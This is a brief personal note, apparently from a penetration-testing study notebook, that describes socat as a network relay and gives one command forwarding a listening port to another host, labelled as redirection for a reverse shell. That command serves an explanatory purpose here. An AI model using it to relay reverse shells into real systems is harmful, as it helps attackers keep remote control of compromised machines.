#scoat #netework #shells #ReverseShell 
- [socat(1): Multipurpose relay - Linux man page (die.net)](https://linux.die.net/man/1/socat)
- **Socat** is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.
- `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`  Socat Redirection with a Reverse Shell